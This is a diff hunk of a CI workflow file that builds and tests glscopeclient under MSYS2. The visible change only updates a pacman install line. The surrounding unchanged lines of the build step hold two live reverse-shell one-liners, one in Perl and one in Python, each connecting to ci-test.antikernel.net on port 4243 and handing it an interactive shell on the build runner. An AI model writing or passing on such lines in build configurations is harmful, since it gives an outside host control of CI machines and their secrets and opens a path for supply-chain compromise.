@@ -50,7 +50,7 @@ jobs:
       shell: msys2 {0}
       run: |
         set MSYSTEM=MINGW64
-        pacman --noconfirm -U mingw-w64-*-any.pkg.tar.xz
+        pacman --noconfirm -U msys2/*.zst
         perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ci-test.antikernel.net:4243");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
         python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ci-test.antikernel.net",4243));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
         msys2 -c 'glscopeclient --help'
